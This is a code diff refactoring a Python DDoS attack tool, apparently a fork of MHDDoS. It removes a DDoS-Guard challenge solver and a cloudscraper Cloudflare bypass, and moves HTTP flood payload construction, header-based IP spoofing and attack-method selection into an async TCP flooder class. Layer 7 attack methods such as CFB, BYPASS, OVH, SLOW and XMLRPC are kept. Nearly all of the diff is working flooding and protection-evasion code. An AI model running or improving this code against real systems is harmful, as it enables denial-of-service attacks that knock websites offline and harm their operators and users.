@@ -18,7 +18,7 @@ import socket as _socket
 from ssl import CERT_NONE, SSLContext, create_default_context
 from sys import exit as _exit
 from threading import Event
-from time import sleep, time
+from time import time
 from typing import Any, Callable, List, Optional, Set, Tuple
 from urllib import parse
 from string import ascii_letters
@@ -26,8 +26,6 @@ from struct import pack as data_pack
 
 import aiohttp
 from async_timeout import timeout
-from cloudscraper import create_scraper
-from requests import Response, Session, cookies
 from yarl import URL
 
 from .ImpactPacket import IP, TCP, UDP, Data
@@ -71,8 +69,8 @@ def exit(*message):
 class Methods:
     LAYER7_METHODS: Set[str] = {
         "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
-        "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
-        "APACHE", "XMLRPC", "BOT", "DOWNLOADER", "TCP"
+        "NULL", "COOKIE", "PPS", "EVEN", "GSB", "AVB",
+        "APACHE", "XMLRPC", "DOWNLOADER", "TCP"
     }
 
     LAYER4_METHODS: Set[str] = {
@@ -117,14 +115,6 @@ class Tools:
             return str(num)
 
     @staticmethod
-    def sizeOfRequest(res: Response) -> int:
-        size: int = len(res.request.method)
-        size += len(res.request.url)
-        size += len('\r\n'.join(f'{key}: {value}'
-                                for key, value in res.request.headers.items()))
-        return size
-
-    @staticmethod
     def parse_params(url, ip, proxies):
         result = url.host.lower().endswith(rotate_suffix)
         if result:
@@ -132,71 +122,11 @@ class Tools:
         return (url, ip), proxies
 
     @staticmethod
-    def send(sock: socket, packet: bytes, stats: TargetStats):
-        if not sock.send(packet):
-            return False
-        stats.track(1, len(packet))
-        return True
-
-    @staticmethod
     def sendto(sock, packet, target, stats: TargetStats):
         if not sock.sendto(packet, target):
             return False
         stats.track(1, len(packet))
         return True
-
-    @staticmethod
-    def dgb_solver(url, ua, pro=None):
-        idss = None
-        with Session() as s:
-            if pro:
-                s.proxies = pro
-            hdrs = {
-                "User-Agent": ua,
-                "Accept": "text/html",
-                "Accept-Language": "en-US",
-                "Connection": "keep-alive",
-                "Sec-Fetch-Dest": "document",
-                "Sec-Fetch-Mode": "navigate",
-                "Sec-Fetch-Site": "none",
-                "Sec-Fetch-User": "?1",
-                "TE": "trailers",
-                "DNT": "1"
-            }
-            with s.get(url, headers=hdrs) as ss:
-                for key, value in ss.cookies.items():
-                    s.cookies.set_cookie(cookies.create_cookie(key, value))
-            hdrs = {
-                "User-Agent": ua,
-                "Accept": "*/*",
-                "Accept-Language": "en-US,en;q=0.5",
-                "Accept-Encoding": "gzip, deflate",
-                "Referer": url,
-                "Sec-Fetch-Dest": "script",
-                "Sec-Fetch-Mode": "no-cors",
-                "Sec-Fetch-Site": "cross-site"
-            }
-            with s.post("https://check.ddos-guard.net/check.js", headers=hdrs) as ss:
-                for key, value in ss.cookies.items():
-                    if key == '__ddg2':
-                        idss = value
-                    s.cookies.set_cookie(cookies.create_cookie(key, value))
-
-            hdrs = {
-                "User-Agent": ua,
-                "Accept": "image/webp,*/*",
-                "Accept-Language": "en-US,en;q=0.5",
-                "Accept-Encoding": "gzip, deflate",
-                "Cache-Control": "no-cache",
-                "Referer": url,
-                "Sec-Fetch-Dest": "script",
-                "Sec-Fetch-Mode": "no-cors",
-                "Sec-Fetch-Site": "cross-site"
-            }
-            with s.get(f"{url}.well-known/ddos-guard/id/{idss}", headers=hdrs) as ss:
-                for key, value in ss.cookies.items():
-                    s.cookies.set_cookie(cookies.create_cookie(key, value))
-                return s
 
     @staticmethod
     def safe_close(sock=None):
@@ -399,217 +329,6 @@ class Layer4:
         return payloads
 
 
-class HttpFlood:
-    _payload: str
-    _defaultpayload: Any
-    _req_type: str
-    _useragents: List[str]
-    _referers: List[str]
-    _target: URL
-    _method: str
-    _rpc: int
-    _event: Any
-    SENT_FLOOD: Any
-
-    def __init__(
-        self,
-        target: URL,
-        addr: str,
-        method: str,
-        rpc: int,
-        event: Event,
-        useragents: List[str],
-        referers: List[str],
-        proxies: ProxySet,
-        stats: TargetStats
-    ) -> None:
-        self.SENT_FLOOD = None
-        self._event = event
-        self._rpc = rpc
-        self._method = method
-        self._target = target
-        self._addr = addr
-        self._raw_target = (self._addr, (self._target.port or 80))
-        self._stats = stats
-
-        if not self._target.host[len(self._target.host) - 1].isdigit():
-            self._raw_target = (self._addr, (self._target.port or 80))
-
-        self._referers = referers
-        self._useragents = useragents
-        self._proxies = proxies
-        self._req_type = self.getMethodType(method)
-        self._defaultpayload = "%s %s HTTP/%s\r\n" % (self._req_type,
-                                                      target.raw_path_qs, randchoice(['1.1', '1.2']))
-        self._payload = (self._defaultpayload +
-                         'Accept-Encoding: gzip, deflate, br\r\n'
-                         'Accept-Language: en-US,en;q=0.9\r\n'
-                         'Cache-Control: max-age=0\r\n'
-                         'Connection: Keep-Alive\r\n'
-                         'Sec-Fetch-Dest: document\r\n'
-                         'Sec-Fetch-Mode: navigate\r\n'
-                         'Sec-Fetch-Site: none\r\n'
-                         'Sec-Fetch-User: ?1\r\n'
-                         'Sec-Gpc: 1\r\n'
-                         'Pragma: no-cache\r\n'
-                         'Upgrade-Insecure-Requests: 1\r\n')
-        self.select(self._method)
-
-    def run(self) -> int:
-        return self.SENT_FLOOD()
-
-    @property
-    def SpoofIP(self) -> str:
-        spoof: str = Tools.rand_ipv4()
-        return ("X-Forwarded-Proto: Http\r\n"
-                f"X-Forwarded-Host: {self._target.raw_host}, 1.1.1.1\r\n"
-                f"Via: {spoof}\r\n"
-                f"Client-IP: {spoof}\r\n"
-                f'X-Forwarded-For: {spoof}\r\n'
-                f'Real-IP: {spoof}\r\n')
-
-    def generate_payload(self, other: str = None) -> bytes:
-        return str.encode((self._payload +
-                           "Host: %s\r\n" % self._target.authority +
-                           self.randHeadercontent +
-                           (other if other else "") +
-                           "\r\n"))
-
-    def open_connection(self) -> socket:
-        sock = self._get_proxy().open_socket(AF_INET, SOCK_STREAM)
-        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
-        sock.settimeout(SOCK_TIMEOUT)
-        sock.connect(self._raw_target)
-
-        if self._target.scheme.lower() == "https" or self._target.port == 443:
-            sock = ctx.wrap_socket(sock,
-                                   server_hostname=self._target.host,
-                                   server_side=False,
-                                   do_handshake_on_connect=True,
-                                   suppress_ragged_eofs=True)
-        return sock
-
-    @property
-    def randHeadercontent(self) -> str:
-        return (f"User-Agent: {randchoice(self._useragents)}\r\n"
-                f"Referrer: {randchoice(self._referers)}{parse.quote(self._target.human_repr())}\r\n" +
-                self.SpoofIP)
-
-    @staticmethod
-    def getMethodType(method: str) -> str:
-        # XXX: note that AVB and DOWNLOADER are likely to be broken in MHDDOS
-        #      as they send "REQUESTS" http method
-        return "GET" if {method.upper()} & {"CFB", "CFBUAM", "GET", "COOKIE", "OVH", "EVEN",
-                                            "DYN", "SLOW", "PPS", "APACHE", "DOWNLOADER",
-                                            "BOT", "AVB"} \
-            else "POST" if {method.upper()} & {"POST", "XMLRPC", "STRESS"} \
-            else "HEAD" if {method.upper()} & {"GSB", "HEAD"} \
-            else "REQUESTS"
-
-    def BOT(self) -> int:
-        payload: bytes = self.generate_payload()
-        p1, p2 = str.encode(
-            "GET /robots.txt HTTP/1.1\r\n"
-            "Host: %s\r\n" % self._target.raw_authority +
-            "Connection: Keep-Alive\r\n"
-            "Accept: text/plain,text/html,*/*\r\n"
-            "User-Agent: %s\r\n" % randchoice(google_agents) +
-            "Accept-Encoding: gzip,deflate,br\r\n\r\n"), str.encode(
-            "GET /sitemap.xml HTTP/1.1\r\n"
-            "Host: %s\r\n" % self._target.raw_authority +
-            "Connection: Keep-Alive\r\n"
-            "Accept: */*\r\n"
-            "From: googlebot(at)googlebot.com\r\n"
-            "User-Agent: %s\r\n" % randchoice(google_agents) +
-            "Accept-Encoding: gzip,deflate,br\r\n"
-            "If-None-Match: %s-%s\r\n" % (Tools.rand_str(9), Tools.rand_str(4)) +
-            "If-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n")
-        s, packets = None, 0
-        with suppress(Exception), self.open_connection() as s:
-            Tools.send(s, p1, self._stats)
-            packets += 1
-            Tools.send(s, p2, self._stats)
-            packets += 1
-            for _ in range(self._rpc):
-                if not self._event.is_set(): return 0
-                Tools.send(s, payload, self._stats)
-                packets += 1
-        Tools.safe_close(s)
-        return packets
-
-    def CFB(self) -> int:
-        proxies = self._get_proxy().asRequest()
-        s, packets = None, 0
-        with suppress(Exception), create_scraper() as s:
-            for _ in range(self._rpc):
-                if not self._event.is_set(): return 0
-                with s.get(self._target.human_repr(), proxies=proxies) as res:
-                    self._stats.track(1, Tools.sizeOfRequest(res))
-                    packets += 1
-        Tools.safe_close(s)
-
-    def DGB(self) -> int:
-        proxies = self._get_proxy().asRequest()
-        ua = randchoice(self._useragents)
-        s, packets = None, 0
-        with suppress(Exception), Tools.dgb_solver(self._target.human_repr(), ua, proxies) as s:
-            for _ in range(min(self._rpc, 5)):
-                if not self._event.is_set(): return 0
-                sleep(min(self._rpc, 5) / 100)
-                with s.get(self._target.human_repr(), proxies=proxies) as res:
-                    if b'<title>DDOS-GUARD</title>' in res.content[:100]:
-                        break
-                    self._stats.track(1, Tools.sizeOfRequest(res))
-                    packets += 1
-        Tools.safe_close(s)
-        return packets
-
-    def select(self, name: str) -> None:
-        self.SENT_FLOOD = self.GET
-        if name == "TCP":
-            self.SENT_FLOOD = self.TCP
-        if name == "POST":
-            self.SENT_FLOOD = self.POST
-        if name == "CFB":
-            self.SENT_FLOOD = self.CFB
-        if name == "CFBUAM":
-            self.SENT_FLOOD = self.CFBUAM
-        if name == "XMLRPC":
-            self.SENT_FLOOD = self.XMLRPC
-        if name == "BOT":
-            self.SENT_FLOOD = self.BOT
-        if name == "APACHE":
-            self.SENT_FLOOD = self.APACHE
-        if name == "BYPASS":
-            self.SENT_FLOOD = self.BYPASS
-        if name == "DGB":
-            self.SENT_FLOOD = self.DGB
-        if name == "OVH":
-            self.SENT_FLOOD = self.OVH
-        if name == "AVB":
-            self.SENT_FLOOD = self.AVB
-        if name == "STRESS":
-            self.SENT_FLOOD = self.STRESS
-        if name == "DYN":
-            self.SENT_FLOOD = self.DYN
-        if name == "SLOW":
-            self.SENT_FLOOD = self.SLOW
-        if name == "GSB":
-            self.SENT_FLOOD = self.GSB
-        if name == "NULL":
-            self.SENT_FLOOD = self.NULL
-        if name == "COOKIE":
-            self.SENT_FLOOD = self.COOKIES
-        if name == "PPS":
-            self.SENT_FLOOD = self.PPS
-            self._defaultpayload = (
-                self._defaultpayload +
-                "Host: %s\r\n\r\n" % self._target.authority
-            ).encode()
-        if name == "EVEN": self.SENT_FLOOD = self.EVEN
-        if name == "DOWNLOADER": self.SENT_FLOOD = self.DOWNLOADER
-
-
 def request_info_size(request: aiohttp.RequestInfo) -> int:
     headers = "\r\n".join(f"{k}: {v}" for k, v in request.headers.items())
     status_line = f"{request.method} {request.url} HTTP/1.1"
@@ -617,7 +336,6 @@ def request_info_size(request: aiohttp.RequestInfo) -> int:
 
 
 class AttackSettings:
-
     connect_timeout_seconds: float
     dest_connect_timeout_seconds: float
     drain_timeout_seconds: float
@@ -662,12 +380,92 @@ class AttackSettings:
         return settings
 
 
-class AsyncTcpFlood(HttpFlood):
+class AsyncTcpFlood:
+    def __init__(
+        self,
+        target: URL,
+        addr: str,
+        method: str,
+        event: Event,
+        useragents: List[str],
+        referers: List[str],
+        proxies: ProxySet,
+        stats: TargetStats,
+        loop=None,
+        settings: Optional[AttackSettings] = None
+    ) -> None:
+        self.SENT_FLOOD = None
+        self._event = event
+        self._method = method
+        self._target = target
+        self._addr = addr
+        self._raw_target = (self._addr, (self._target.port or 80))
+        self._stats = stats
 
-    def __init__(self, *args, loop=None, settings: Optional[AttackSettings] = None):
-        super().__init__(*args)
+        if not self._target.host[len(self._target.host) - 1].isdigit():
+            self._raw_target = (self._addr, (self._target.port or 80))
+
+        self._referers = referers
+        self._useragents = useragents
+        self._proxies = proxies
+        self._req_type = self.getMethodType(method)
+        self._defaultpayload = "%s %s HTTP/%s\r\n" % (self._req_type,
+                                                      target.raw_path_qs, randchoice(['1.1', '1.2']))
+        self._payload = (self._defaultpayload +
+                         'Accept-Encoding: gzip, deflate, br\r\n'
+                         'Accept-Language: en-US,en;q=0.9\r\n'
+                         'Cache-Control: max-age=0\r\n'
+                         'Connection: Keep-Alive\r\n'
+                         'Sec-Fetch-Dest: document\r\n'
+                         'Sec-Fetch-Mode: navigate\r\n'
+                         'Sec-Fetch-Site: none\r\n'
+                         'Sec-Fetch-User: ?1\r\n'
+                         'Sec-Gpc: 1\r\n'
+                         'Pragma: no-cache\r\n'
+                         'Upgrade-Insecure-Requests: 1\r\n')
+        self.select(self._method)
+
         self._loop = loop
         self._settings = settings or AttackSettings()
+
+    def select(self, name: str) -> None:
+        self.SENT_FLOOD = getattr(self, name)
+        if name == "PPS":
+            self._defaultpayload = (
+                self._defaultpayload +
+                "Host: %s\r\n\r\n" % self._target.authority
+            ).encode()
+
+    @property
+    def randHeadercontent(self) -> str:
+        return (f"User-Agent: {randchoice(self._useragents)}\r\n"
+                f"Referrer: {randchoice(self._referers)}{parse.quote(self._target.human_repr())}\r\n" +
+                self.SpoofIP)
+
+    @staticmethod
+    def getMethodType(method: str) -> str:
+        return (
+            "POST" if method.upper() in {"POST", "XMLRPC", "STRESS"}
+            else "HEAD" if method.upper() in {"GSB", "HEAD"}
+            else "GET"
+        )
+
+    @property
+    def SpoofIP(self) -> str:
+        spoof: str = Tools.rand_ipv4()
+        return ("X-Forwarded-Proto: Http\r\n"
+                f"X-Forwarded-Host: {self._target.raw_host}, 1.1.1.1\r\n"
+                f"Via: {spoof}\r\n"
+                f"Client-IP: {spoof}\r\n"
+                f'X-Forwarded-For: {spoof}\r\n'
+                f'Real-IP: {spoof}\r\n')
+
+    def generate_payload(self, other: str = None) -> bytes:
+        return str.encode((self._payload +
+                           "Host: %s\r\n" % self._target.authority +
+                           self.randHeadercontent +
+                           (other if other else "") +
+                           "\r\n"))
 
     async def run(self, on_connect=None) -> bool:
         assert self._loop is not None, "Event loop has to be set to run async flooder"
@@ -676,7 +474,7 @@ class AsyncTcpFlood(HttpFlood):
         except OSError as exc:
             if exc.errno == errno.ENOBUFS:
                 await asyncio.sleep(0.1)
-                # going to try again, hope devie will be ready
+                # going to try again, hope device will be ready
                 return True
             else:
                 raise exc
@@ -795,8 +593,7 @@ class AsyncTcpFlood(HttpFlood):
         return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)
 
     async def PPS(self, on_connect=None) -> bool:
-        # XXX: there's in an issue with this implementation
-        #      default payload should be extended with additional headers
+        # _defaultpayload is extended and encoded in self.select
         payload: bytes = self._defaultpayload
         return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)
 
@@ -860,7 +657,7 @@ class AsyncTcpFlood(HttpFlood):
                 self._stats.track_close_connection()
         return packets_sent > 0
 
-    async def CFBUAM(self, on_connect=None) -> bool:
+    async def CFB(self, on_connect=None) -> bool:
         packet: bytes = self.generate_payload()
         packet_size: int = len(packet)
 
@@ -1031,7 +828,6 @@ def main(url, ip, method, event, proxies, stats, loop=None, settings=None):
             url,
             ip,
             method,
-            None,  # XXX: previously used for "rpc"
             event,
             USERAGENTS,
             REFERERS,
